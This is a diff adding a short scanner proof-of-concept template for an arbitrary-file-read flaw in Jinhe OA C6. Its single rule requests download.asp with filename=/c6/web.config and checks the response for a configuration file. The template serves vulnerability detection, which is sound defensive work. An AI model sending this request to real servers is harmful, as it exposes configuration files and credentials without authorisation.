@@ -1,0 +1,15 @@
+name: poc-yaml-jinhe-oa-readfile
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
+        expression: response.status == 200 && response.body.bcontains(bytes("<configuration>"))
+expression: r0()
+detail:
+    author: Monday
+    links:
+        - http://wiki.peiqi.tech/wiki/oa/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20download.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
